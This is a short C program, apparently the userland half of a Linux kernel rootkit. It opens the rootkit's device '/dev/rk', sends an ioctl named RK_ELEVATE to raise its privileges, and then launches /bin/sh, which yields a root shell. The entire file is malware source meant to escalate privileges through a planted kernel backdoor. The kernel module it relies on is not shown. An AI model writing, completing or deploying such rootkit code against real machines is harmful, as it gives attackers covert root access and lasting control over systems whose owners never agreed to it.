#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "../kernel/interface.h"

int main(void) {
	int fd;

	fd = open("/dev/rk", O_RDWR);

	 if (fd == -1) {
        perror("open");
        return -1;
    }

    if (ioctl(fd, RK_ELEVATE) == -1) {
        perror("ioctl");
        close(fd);
        return -1;
    }

    close(fd);

    execl("/bin/sh", "sh", NULL);
    perror("oopsies lmao");

	return 0;
}